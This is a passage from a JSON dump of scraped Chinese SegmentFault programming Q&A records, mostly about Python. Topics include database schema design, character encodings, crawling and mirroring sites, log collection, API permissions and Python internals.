      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000607145\">\n<p>从国外开源项目提取出来的一份Schema，请参考(我的项目中是用MongoDB来存储)：</p>\n<pre><code>@Id\nprivate Long id;\n\n\n/**\n * Identifies the application that generated this message.\n * 标识生成此消息的应用程序\n */\nprivate String appUrl;\n\n/**\n * The main text of the message. HTML attributes are allowed and are sanitized by the container.\n * 消息内容，可以是html格式的，但需要注意代码安全\n */\nprivate String body;\n\n/**\n * The main text of the message as a message template. Specifies the message ID to use in the gadget xml.\n * 消息内容模板。在小工具XML中指定的消息ID\n */\nprivate String bodyId;\n\n/**\n * Identifies the messages collection IDs this message is contained in.\n * 标识的信息收集IDS此消息中包含的。\n */\nprivate List&lt;String&gt; collectionIds;\n\n\n/**\n * Message ID, use for threaded comments/messages. Reference the sematics of the Atom Threading model defined in rfc4685. URLs should be mapped to Atom &lt;link rel=\"type\" .../&gt;\n * 消息ID，用于螺纹评论/消息。参考语义学的Atom在rfc4685中定义的线程模型。 URL应该被映射到Atom&lt;link rel=\"type\".../&gt;\n */\nprivate String inReplyTo;\n\n/**\n * Array of person IDs.\n * 收信人\n */\n@Indexed\nprivate Long recipient;\n\n/**\n * Array of message ids. Reference the sematics of the Atom Threading model defined in rfc4685. URLs should be mapped to Atom &lt;link rel=\"type\" .../&gt;\n * 回复的消息ID集合\n */\nprivate List&lt;String&gt; replies;\n\n/**\n * Id of person who sent the message.\n * 发送人\n */\nprivate String senderId;\n\n/**\n * 发送人，\n * 注意：与senderId可以相重，例如张三、李四关注了您，senderId为系统发送，而senders#key则为张三、李四\n */\nprivate Map&lt;Long, String&gt; senders;\n\n/**\n * Status of the message. (NEW, READ, DELETED).\n * 消息状态：未读、已读、删除\n*/\n@org.springframework.data.annotation.Transient\nprivate Status status;\n\n/**\n * UTC time message was sent.\n * 消息发送时间\n */\nprivate Date timeSent;\n\n/**\n * The title of the message. HTML attributes are allowed and are sanitized by the container.\n * 可以带Html格式的消息标题\n */\nprivate String title;\n\n/**\n * The title of the message as a message template. Specifies the message ID to use in the gadget xml.\n * 消息标题模板。指定的消息ID中使用的小工具XML。\n * 用于邮件提交\n */\nprivate String titleId;\n\n/**\n * The type of the message.\n * 类型：邮件、通知、私信、公共消息(公告)\n */\n@Indexed\nprivate Type type;\n\n/**\n * Last update for this message.\n * 最后更新时间\n */\nprivate Date updated;\n\n/**\n * List of related URLs for this message. Supported URL types include 'alternate', alternate for for this mailbox (text/html being the most common).\n * 此消息相关的URL列表。支持的URL类型包括备用，备用此邮箱（文本/ HTML是最常见的）\n */\nprivate List&lt;Url&gt; urls;\n</code></pre>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000605250\">\n<p>来，给你看看我网站久经考验、扩展极佳的通知表结构</p>\n<pre><code>CREATE TABLE `user_notification` (\n  `id` int(10) NOT NULL AUTO_INCREMENT,\n  `author_id` int(10) NOT NULL DEFAULT '0',\n  `type` int(10) NOT NULL DEFAULT '0' COMMENT '通知类型ID',\n  `title` char(100) NOT NULL DEFAULT '',\n  `identify` char(20) NOT NULL DEFAULT '' COMMENT '应用的ID(比如文章的aid,新鲜事的tid)',\n  `extra_params` text NOT NULL COMMENT '附加参数',\n  `is_read` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否已读',\n  `is_ignore` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否忽略',\n  `create_at` int(10) NOT NULL DEFAULT '0',\n  `create_date` date NOT NULL,\n  `update_at` int(10) NOT NULL DEFAULT '0',\n  PRIMARY KEY (`id`),\n  KEY `idx_read_updated` (`author_id`,`update_at`)\n) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 ROW_FORMAT=COMPACT COMMENT='用户通知表';\n</code></pre>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000602948\">\n<p>因为考虑到<strong>扩展性</strong>，对于不同事务，提醒的内容不同且差别较大。无法确定消息的内容需要哪些域，并且考虑到<strong>效率</strong>问题也没有使用索引或者存放相应id。然后考虑用简单的处理，就是Notice只包含接收人，时间，是否已读，内容(str)。内容的生成交给不同模块自己处理，但是，这样也有问题，因为前端得到的是text/html，所以进一步加工的灵活性差。</p>\n<p>我想了解的是，一般网站的消息模型是怎么样的呢？或者简单说，消息载体是如何承载信息的呢？</p>\n<p>小弟刚接触后端，所以在此请求大家的指点，十分感谢！</p>\n</div>",
      "favourite": "13",
      "glance": "2.9k",
      "tags": [
        "python",
        "后端",
        "消息",
        "网站设计",
        "django"
      ],
      "time": "2014-07-12",
      "title": "网站系统消息的模型该如何设计？（model要存哪些field？）",
      "url": "https://segmentfault.com/q/1010000000602948"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000642181\">\n<p>深入分析Java Web技术内幕 许令波写的 3.3节<br>\n上面这书是我见过的对编码解释的最清晰的了 可以找找看看</br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000642215\">\n<p>百度一下，一大堆的博客介绍这个。</p>\n<p><a href=\"http://blog.csdn.net/garfield2005/article/details/7681299\" rel=\"nofollow\">http://blog.csdn.net/garfield2005/article/details/7681299</a></p>\n<p><a href=\"http://www.cnblogs.com/cy163/archive/2007/05/31/766886.html\" rel=\"nofollow\">http://www.cnblogs.com/cy163/archive/2007/05/31/766886.html</a></p>\n<p>...</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000645849\">\n<p>ANSI是标准集，美国国家标准协会，涵盖多方面，类似大陆的国标<br>\nwin下的ANSI是狭义的，指的是当前系统的编码，相当于code page</br></p>\n<p>GB2312是国标，双字节字符集，但制定年份较早，包含的汉字（含标点符号等）较少<br>\nGBK是在GB2312的基础上扩展的，利用其中未被使用的码位，纳入更多的汉字和符号，所以一般情况下应该用GBK而不是GB2312。网页使用gb2312没问题是因为网页本身只是显示，取决于客户端的字体，即使超出gb2312编码范围的字符，只要字体包含就能显示，目前客户端的字体基本上都是足够显示gbk的，不会只有gb2312那么少字符，所以显示完全没问题。但编程时这两个就要分清楚，因为gb2312的字符数量少，容易造成转码错误，所以应该用gbk</br></p>\n<p>unicode是字符集，其实是个码表，不是具体的编码，具体的编码是uc2，uc4，utf-7，utf-8，utf-16，utf-32等，uc是定长，每个字符字节数相同，utf是变长，字符视乎unicode的码位段字节数不同<br>\nwindows下的unicode指的是utf-16，这样就有点混淆了概念<br>\nbom的概念是在文件最前面加上几个特定字节，以方便识别这是一个unicode某个编码的文本</br></br></p>\n<p>编码间的转换一般用码表，这个一般如果不是研究，用现有的一些控件或接口就可以了，例如iconv等</p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000642153\">\n<html><body>\n<p>从接触编程以来，一直对编码的知识一知半解,总没有掌握精髓。<br>\n比如：ansi和gbk的关系，gbk和gb2312又有何关系，ansi和utf8有何区别，Unicode又和utf8是什么关系，以及ansi、gbk、gb2312、utf8（有无Bom之分）、utf16、utf32、Unicode之间的相互转换等等，心中的疑问总没有找个机会解决下，希望能在segmentfault得到满意的答案。</br></p>\n<hr>\n<p>如果有这方面的书籍的话（javascript的最好了，因为刚好是在javascript中碰到的问题），最好不过了！</p>\n<hr>\n<h2>汇总</h2>\n<blockquote>\n<p>书籍<br><a href=\"http://download.csdn.net/download/lactoferrin/4299042\" rel=\"nofollow\">《fonts and encodings》</a>只找到英文版<br>\n  许令波的《深入分析Java Web技术内幕》3.3节</br></br></p>\n</blockquote>\n<blockquote>\n<p>文章<br><a href=\"http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html\" rel=\"nofollow\">字符编码笔记：ASCII，Unicode和UTF-8</a><br><a href=\"http://www.pconline.com.cn/pcedu/empolder/gj/other/0505/616631.html\" rel=\"nofollow\">谈谈Unicode编码</a><br><a href=\"http://www.cnblogs.com/cy163/archive/2007/05/31/766886.html\" rel=\"nofollow\">UNICODE,GBK,UTF-8区别</a><br><a href=\"http://my.oschina.net/alphajay/blog/5691\" rel=\"nofollow\">Unicode字符集和多字节字符集关系</a><br><a href=\"http://blog.csdn.net/smonster/article/details/3194587\" rel=\"nofollow\">谈谈Unicode编码，简要解释UCS、UTF、BMP、BOM等名词</a><br><a href=\"http://ruowu.iteye.com/blog/734746\" rel=\"nofollow\">分析记事本写联通两字出现乱码的原因1</a><br><a href=\"http://haishangren.blog.163.com/blog/static/366984132010212101939864/\" rel=\"nofollow\">分析记事本写联通两字出现乱码的原因2</a><br><a href=\"http://www.basecss.net/article/mini-code-with-great-learing.html\" rel=\"nofollow\">小代码大学问之JavaScript位运算</a></br></br></br></br></br></br></br></br></p>\n</blockquote>\n<p>其他：<br><a href=\"http://www.chi2ko.com/tool/CJK.htm\" rel=\"nofollow\">字体编辑用中日韩汉字Unicode编码表</a><br><img data-src=\"http://segmentfault.com/img/bVcRgH\"/></br></br></p>\n</hr></hr></body></html>\n</div>",
      "favourite": "14",
      "glance": "3.7k",
      "tags": [
        "程序员",
        "php",
        "python",
        "编程",
        "编码"
      ],
      "time": "2014-08-20",
      "title": "关于编码：ansi、gbk、gb2312、utf8、utf16、utf32、Unicode",
      "url": "https://segmentfault.com/q/1010000000642153"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000645750\">\n<html><body>\n<p>问题描述：<br><img data-src=\"http://segmentfault.com/img/bVcR9t\"><br>\n一些文件名中包含有特殊字符（乱码的字符，或者一些未知的特殊字符），现在想通过python来提取出这些“特别的”文件。<br>\n请问，有什么比较好的办法可以实现吗？</br></br></img></br></p>\n<hr>\n<p>目前的思路：通过遍历文件名中的每个字符，并检查其Unicode编码值是否在汉字的范围内（换句话说：判断其是否是汉字），如果不是，就提取出来</p>\n</hr></body></html>\n</div>",
      "favourite": "0",
      "glance": "9.4k",
      "tags": [
        "python"
      ],
      "time": "2014-08-22",
      "title": "Python：过滤一些特殊字符",
      "url": "https://segmentfault.com/q/1010000000645750"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000666021\">\n<p>如题，python 中的元类是用来做什么的？</p>\n</div>",
      "favourite": "1",
      "glance": "1.1k",
      "tags": [
        "python",
        "metaclass"
      ],
      "time": "2014-09-12",
      "title": "如何理解 Python 中的元类？",
      "url": "https://segmentfault.com/q/1010000000666021"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000727568\">\n<pre><code>class OtherClass:\n    def otherFunc(other, name):\n        other.name = name\n</code></pre>\n<p>你想这样写也没问题呀,你开心就好 :)</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000727910\">\n<pre><code>class myClass(object):\n    def myFunc(self, name):\n        self.name = name\n\na = myClass()\na.myFunc('yetone')\n</code></pre>\n<p>就相当于：</p>\n<pre><code>class myClass(object):\n    pass\n\nfunc myFunc(self, name):\n    self.name = name\n\na = myClass()\nmyFunc(a, 'yetone')\n</code></pre>\n<p>现在明白 self 的意思了吧，self 就是指调用者本身。当实例对象 foo 调用其 bar 方法时：<code>foo.bar()</code> 在底层就是把 foo 作为函数 bar 的第一个参数进行调用而已。<br>\n至于为什么参数名非要叫 self，这只是一个推荐的规范而已。你可以起任何变量名。</br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000727777\">\n<p>面向对象中静态方法与实例方法的区别，不加<code>self</code>声明方法为当前类的静态成员，使用<code>myClass.myFun()</code>调用，如果添加<code>self</code>则定义为类实例成员，这样调用</p>\n<pre><code>c = myClass()\nc.myFun()\n</code></pre>\n<p>从执行角度来讲，都能调用，但要更符合面向对象原则，则建议区分开，更进一步讲，如果某个行为与具体的实例关系不大时比如数据访问工具类的方法，则可以不加<code>self</code>定义为类成员，如果以多态的角度出发该行为与实例关系更紧密时，则需要加<code>self</code></p>\n</div>",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000727519\">\n<p>为什么要给每个方法都加入 self 作为参数？</p>\n<pre><code>class myClass:\n    def myFunc(self, name):\n        self.name = name\n</code></pre>\n<p>求解释！</p>\n</div>",
      "favourite": "5",
      "glance": "1.6k",
      "tags": [
        "python"
      ],
      "time": "2014-10-17",
      "title": "该怎样解释 python 中的 'self' ？",
      "url": "https://segmentfault.com/q/1010000000727519"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000729115\">\n<p>我经常遇到的麻烦是，有的时候并不需要下载整个页面，可能是页面的某个div，其他边栏顶栏都不需要。这个时候我通常会用正则或者字符串函数截取需要的部分，拼装之后写文件。css其实不是大问题，可以自己配，拼装的时候写好就可以。我一般都是先把原配的下载下来，手工组装出一个页面去调，不合适自己再写另外一个文件加上一些样式。另外不建议直接拿shellscript去爬，因为要处理的东西太复杂了，用py的http模块是个不错的选择。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000729313\">\n<p>坦白：多年前曾经盗版过 Teleport Ultra 用来扒离线站点，效果不错，相关css和js能够直接识别到，并能够无条件下载，或设定过滤条件（扩展名、文件大小等）部分下载</p>\n<p>免费或开源方案目前仍在寻求中</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000735643\">\n<p><a href=\"http://www.httrack.com/\" rel=\"nofollow\">HTTRACK</a></p>\n</div>",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000729059\">\n<p>有时候想把一些不错的静态站点的内容离线下来，然后制作成为Docset放在Dash里面便于管理查看。将站点，其实就是带有索引(一般是index.html)的html文件转换为docset格式这一步已经用python实现自动化了。剩下的问题就是如何离线静态站点。</p>\n<p>目前主要有两种方法：</p>\n<ol>\n<li>用wget下载资源，一般用 <code>wget -r -p -k -np [site_root_path]</code>命令；</li>\n<li>用SiteSucker下载。</li>\n</ol>\n<p>但是这两种方法都不是很完美，因为上面两种方法下载页面时，只下载: site_root_path以及子目录下的html文件，这样会导致一些引用的js脚本，css样式表以及图片等都下载不了。比如<a href=\"http://djangobook.py3k.cn/2.0/\" rel=\"nofollow\">The Django Book</a> 这个网站，如果用</p>\n<pre><code>wget -r -p -k -np http://djangobook.py3k.cn/2.0/ \n</code></pre>\n<p>就无法下载到<code>http://djangobook.py3k.cn/sitemedia/css/djangobook.css</code>以及其它的一些资源，这就导致在Dash中查看时失去一些样式。</p>\n<p>所以问题来了，有没有现成的傻瓜方法可以让我完美的备份静态站点？（完美就是指下载某个目录时，要下载它的所有子目录，并且也要选择性的下载要使用到的但不在该目录下的css、js以及图片文件。）</p>\n</div>",
      "favourite": "3",
      "glance": "2.5k",
      "tags": [
        "python",
        "web"
      ],
      "time": "2014-10-18",
      "title": "如何完美备份(离线)静态站点？",
      "url": "https://segmentfault.com/q/1010000000729059"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002489346\">\n<p>multi-mechanize <a href=\"http://multimechanize.com\" rel=\"nofollow\">http://multimechanize.com</a> <a href=\"https://pypi.python.org/pypi/multi-mechanize\" rel=\"nofollow\">https://pypi.python.org/pypi/multi-mechanize</a></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002653882\">\n<p><a href=\"http://www.haoservice.com/\" rel=\"nofollow\">http://www.haoservice.com/</a>  你去这上面看看</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000001638081\">\n<p><a href=\"http://apiary.io/\" rel=\"nofollow\">http://apiary.io/</a></p>\n<p>Collaborative design, instant API mock, generated documentation, integrated code samples, debugging and automated testing.</p>\n</div>",
      "attention": "16",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000001638046\">\n<p>目前开发的api接口需要测试性能和负载，要求api接口参数可自定义，譬如使用某种规则封装api参数，目前的api接口都是post请求接口，有什么推荐的好工具吗？</p>\n</div>",
      "favourite": "4",
      "glance": "6.6k",
      "tags": [
        "java",
        "php",
        "python"
      ],
      "time": "2014-11-15",
      "title": "求推荐：api接口并发测试工具",
      "url": "https://segmentfault.com/q/1010000001638046"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002464714\">\n<p><a href=\"http://www.pythonchallenge.com/\" rel=\"nofollow\">pythonchallenge</a></p>\n<p>好好玩</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002464883\">\n<p>这个应该是哪位前辈曾经提过的，我存了个书签，现在传递给题主</p>\n<p><a href=\"http://www.codewars.com/?language=python\" rel=\"nofollow\">codewars</a></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002465350\">\n<p>看课程:<a href=\"https://www.coursera.org/\" rel=\"nofollow\">https://www.coursera.org/</a><br>\n在线Code:<a href=\"http://www.codecademy.com/zh/\" rel=\"nofollow\">http://www.codecademy.com/zh/</a><br>\n通过游戏code:<a href=\"http://codecombat.com/\" rel=\"nofollow\">http://codecombat.com/</a></br></br></p>\n</div>",
      "attention": "7",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002464709\">\n<p>各位好，我是一个Python新手，看书看了一大半，连一点题都没做过，实感不适。<br>\n请问有哪些网站，可以做到Python的基础题，或者其他语言实现的，我可以用python重写的。<br>\n谢谢各位了……</br></br></p>\n</div>",
      "favourite": "12",
      "glance": "2.6k",
      "tags": [
        "python3.x",
        "python"
      ],
      "time": "2015-01-05",
      "title": "有哪些网站可以刷Python的基础题？",
      "url": "https://segmentfault.com/q/1010000002464709"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002520346\">\n<pre><code>look = codecs.lookup(\"utf-8\")\nstr = look.decode(\"测试\")[0]\n</code></pre>\n<pre><code>str = \"测试\".decode(\"utf-8\")\n</code></pre>\n<p>以上2段代码有什么本质区别吗？<br>\n是否<strong>look.decode</strong>的容错能力更强。</br></p>\n</div>",
      "favourite": "0",
      "glance": "1.1k",
      "tags": [
        "python"
      ],
      "time": "2015-01-28",
      "title": "Python：2段解码（decode）代码的本质区别",
      "url": "https://segmentfault.com/q/1010000002520346"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003800314\">\n<p>ELK全部搞定 妥妥的  <a href=\"https://www.elastic.co/\">https://www.elastic.co/</a></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002555073\">\n<p>说一个常用方案：很多公司都是专门布了脚本，定时去抓，抓完了索引存到数据平台，数据平台提供查询，接口确实是略重。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002558766\">\n<p>你的这个需求直接使用elasticsearch、logstash和kibana结合即可，部署配置都比较简单，实时性较高，又不用开发代码~</p>\n</div>",
      "attention": "26",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002554734\">\n<p>在项目上线后，往往需要监控一些日志，但是日志分散在各个服务器的不同角落，查看时需要找到某应用在那台服务器上，然后翻apache或nginx配置找日志路径，耗时耗力很麻烦。<br>\n所以想将这些日志收集到一个地方，做一套web界面的日志查看工具<br>\n需要的日志主要有</br></br></p>\n<ul>\n<li>apache日志</li>\n<li>apache虚拟主机access,error日志</li>\n<li>nginx日志</li>\n<li>nginx虚拟主机access,error日志</li>\n<li>php错误日志</li>\n<li>mysql日志</li>\n<li>php应用日志(如yii的/runtime/application.log)</li>\n</ul>\n<p>基本实现实时查看即可（一分钟内延迟）<br>\n看了下Scribe和Flume，似乎太过重量级，<br>\n我的想法是做个简单的文本变化检测，将新增内容发送到统一redis队列，后端脚本处理入库。<br>\n不知道大家是如何解决这个问题的？探讨下吧！</br></br></br></p>\n</div>",
      "favourite": "7",
      "glance": "2.7k",
      "tags": [
        "php",
        "python",
        "golang",
        "redis"
      ],
      "time": "2015-02-13",
      "title": "日志收集探讨",
      "url": "https://segmentfault.com/q/1010000002554734"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002736946\">\n<p>可以看看这个回答，希望能对你有帮助<a href=\"http://segmentfault.com/q/1010000002567482/a-1020000002568368\" rel=\"nofollow\">http://segmentfault.com/q/1010000002567482/a-1020000002568368</a></p>\n<p>ps：不要怕麻烦，有这个需求就要做的。权限管理有很多工具的，比如spring security就是一个权限管理框架</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002748816\">\n<p>推荐一个很不错的文章：</p>\n<p><a href=\"http://blog.jobbole.com/41233/\" rel=\"nofollow\">http://blog.jobbole.com/41233/</a></p>\n<p>可以参考下。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002739291\">\n<p>1、token形式<br>\n2、oauth2</br></p>\n</div>",
      "attention": "21",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002736834\">\n<p>RT，授权给某个app_id一个access_token，让其访问API的某些资源。如果每个url资源都设置权限的话，好像很麻烦，而且同一个url还分GET、POST等不同请求，如果分别设置权限好像更麻烦。</p>\n<p>有没有好的解决方案？</p>\n</div>",
      "favourite": "9",
      "glance": "3k",
      "tags": [
        "python",
        "php",
        "java",
        "golang",
        "node.js"
      ],
      "time": "2015-05-07",
      "title": "如何设计RESTful的API权限",
      "url": "https://segmentfault.com/q/1010000002736834"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002983287\">\n<p>ecshop</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002984223\">\n<p>opencart</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002986044\">\n<p>Magento.</p>\n</div>",
      "attention": "22",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002982454\">\n<p>完全开源免费的，主要用在移动端</p>\n</div>",
      "favourite": "2",
      "glance": "2k",
      "tags": [
        "php",
        "python"
      ],
      "time": "2015-07-12",
      "title": "开源电商系统选择哪个好？",
      "url": "https://segmentfault.com/q/1010000002982454"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003931482\">\n<p>查了很多资料，这些资料基本直说到GIL会让是字节码只让一个线程执行，但是为什么要这么做的原因，都感觉没说的很彻底。所以想请高人解惑！！</p>\n</div>",
      "favourite": "0",
      "glance": "482",
      "tags": [
        "python"
      ],
      "time": "2015-10-30",
      "title": "cpython引入GIL的目的到底是什么，求详解？",
      "url": "https://segmentfault.com/q/1010000003931482"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000004493533\">\n<p>你这是你写的<code>Python代码</code>在转换成<code>字节码</code>的时候就出错了</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000004493545\">\n<p>语法错误啊，python的或运算 是<code>or</code>，没有<code>||</code>.</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000004492646\">\n<p>Python程序在运行前，是需要被转换成解释器能够识别的中间程序的。<br>是先转换后运行，不是边转换边运行。<br>所以就直接抛异常了</br></br></p>\n</div>",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000004491868\">\n<h3>直接上代码</h3>\n<pre><code class=\"shell\"># python --version\nPython 2.7.6</code></pre>\n<pre><code class=\"python\">def dosomething(a, b):\n    try:\n        if a || b:\n            pass\n    except SyntaxError:\n        print \"syntax error\"\n\ndef main():\n    dosomething(1, 2)\n    \nif __name__ == '__main__':\n    main()</code></pre>\n<p>按我的预期运行之后应该会</p>\n<pre><code class=\"shell\">syntax error</code></pre>\n<p>但实际上，输出</p>\n<pre><code class=\"python\">File 'example.py' line 3\n    if a || b:\n          ↑\nSyntaxError: invalid syntax</code></pre>\n<p>特此请教</p>\n</div>",
      "favourite": "1",
      "glance": "310",
      "tags": [
        "python",
        "exception"
      ],
      "time": "2-25",
      "title": "关于python中异常处理",
      "url": "https://segmentfault.com/q/1010000004491868"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000004692394\">\n<pre><code class=\"py\">while True:\n    pass</code></pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000004692931\">\n<pre><code>\"use strict\";\nconst os = require(\"os\");\nconst restMemory = 0.1;\nlet largeBuffer = [];\nwhile (true) {\n    if (parseFloat(os.freemem() / os.totalmem()) &gt; restMemory) {\n        largeBuffer.push(new Buffer(1024));\n    } else {\n        continue;\n    }\n}</code></pre>\n<p>专门为你写了一段代码，<code>nodejs</code>可以瞬间让你的内存剩余到你指定的<code>restMemory</code>值的位置。特别少的时候会很卡，小心使用。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000004695663\">\n<p>你们都说错了！！！！！！！！</p>\n<p>讲真 只要安装</p>\n<p>1.百度全家桶*<br>2.腾讯电脑管家<br>3.360安全卫士</br></br></p>\n<p>啧啧 然后重启一下电脑 尽情体验卡顿的感觉</p>\n<p>*未成年人请勿模仿 出现意外后果概不负责</p>\n<hr>\n<p>233 有人踩了一下 难道是认为百度可以提速</p>\n</hr></div>",
      "attention": "14",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000004691718\">\n<p>我是windows桌面软件的开发者，我发现了一个问题，如果windows几天不关机，在运行一些软件，会有些慢，即使用了清理释放的相关软件，也没很大作用。重启后即可消失。所以我想在开机的时候进入这种变慢环境，进行优化调试。</p>\n</div>",
      "favourite": "2",
      "glance": "1.2k",
      "tags": [
        "windows",
        "python",
        "c#",
        "c",
        "c++"
      ],
      "time": "3-26",
      "title": "如何让电脑变卡？",
      "url": "https://segmentfault.com/q/1010000004691718"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000004947700\">\n<p>先爬列表页，然后爬子页面，你现在子页面已经处理好了，多爬加个列表页就行了<br>用不着什么深度广度算法</br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000004948038\">\n<p>直接用scrapy</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000004948493\">\n<p>爬的时候把这些url加入到一个url数组中，依次爬取url数组中的url就可以了，可以把这个理解为广度优先搜索</p>\n</div>",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000004946556\">\n<p>毕业设计项目需要从coursera,edx等大型MOOC网站爬取大量公开课课程信息，尝试着爬取了coursera的课程信息，但是每次都要重新在python代码中写入新的url，如：coursera.org/computer/database和coursera.org/computer/algorithm才可以分别爬去database和algorithm的信息，可是coursera中有10大类，平均每类课程又分有6-8个小分类，也就是我需要该大概80次链接，感觉虽然已经比手动录入快很多了，但是自动化程度仍旧带来了一个效率低下的问题，请问有什么方法可以深度爬取一个网站的信息，让人工操作的的工序少一些呢？了解过深度搜索和广度搜索的算法，但是不知道在这里应该如何使用呢？P.S.在这里我是用的python中beautifulsoup4的package进行的html代码解析从而实现crawler。<br>码渣跪求，大神们能配合代码或者伪码来指导一下就最好啦！thx！</br></p>\n</div>",
      "favourite": "0",
      "glance": "524",
      "tags": [
        "python",
        "搜索引擎",
        "firefox",
        "mysql",
        "ubuntu"
      ],
      "time": "4-15",
      "title": "Python深度爬取一个网站",
      "url": "https://segmentfault.com/q/1010000004946556"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000005012781\">\n<h4>tornado源码中IOLoop类中的许多方法都只有<code>raise NotImplementedError()</code>,这样做有什么用处，运行时为何不会报错？</h4>\n<p>例如:</p>\n<pre><code>def close(self, all_fds=False):\n    raise NotImplementedError()\n\ndef start(self):\n    raise NotImplementedError()\n\ndef add_handler(self, fd, handler, events):\n    raise NotImplementedError()</code></pre>\n<p>感谢各位的解答！</p>\n</div>",
      "favourite": "0",
      "glance": "253",
      "tags": [
        "python",
        "tornado"
      ],
      "time": "4-26",
      "title": "tornado源码中IOLoop类的raise NotImplementedError有什么用处？",
      "url": "https://segmentfault.com/q/1010000005012781"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000005175248\">\n<p>看 Python 3.x 的文档，涉及到实例方法特殊属性的内容，有这么一段话描述 <code>instance method</code> 的 <code>__func__</code> 属性：</p>\n<blockquote><p>When an instance method object is created by retrieving a user-defined function object from a class via one of its instances, its <strong>self</strong> attribute is the instance, and the method object is said to be bound. The new method’s <strong>func</strong> attribute is the original function object.<br>When a user-defined method object is created by retrieving another method object from a class or instance, the behaviour is the same as for a function object, except that the <strong>func</strong> attribute of the new instance is not the original method object but its <strong>func</strong> attribute.</br></p></blockquote>\n<p>甚是不解，主要是不明白前后两段中对<code>instance method object</code>的创建方式的描述到底有何不同？ 还请大神赐教</p>\n</div>",
      "favourite": "2",
      "glance": "474",
      "tags": [
        "python",
        "python3.x",
        "特殊属性",
        "method",
        "function"
      ],
      "time": "5-22",
      "title": "Python 3.x 实例方法的__func__属性",
      "url": "https://segmentfault.com/q/1010000005175248"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000005180425\">\n<p>windows平台下，用swig给python2.7写了一个扩展模块，使用vs2013编译的，然后按照官方教程改名导入，本机上可以正常使用，但是换了一台电脑，直接拷贝过去，无法使用。找不到指定模块，该如何解决？<br>将该文件夹添加到系统环境变量和直接放入到python文件夹site-packages/下也没有起作用。</br></p>\n</div>",
      "favourite": "0",
      "glance": "151",
      "tags": [
        "python",
        "swig"
      ],
      "time": "5-23",
      "title": "Windows平台下swig写的python扩展模块，拷贝到其他电脑上无法使用，如何解决？",
      "url": "https://segmentfault.com/q/1010000005180425"
    },
    {
      "answer1": "",
      "answer2": "",
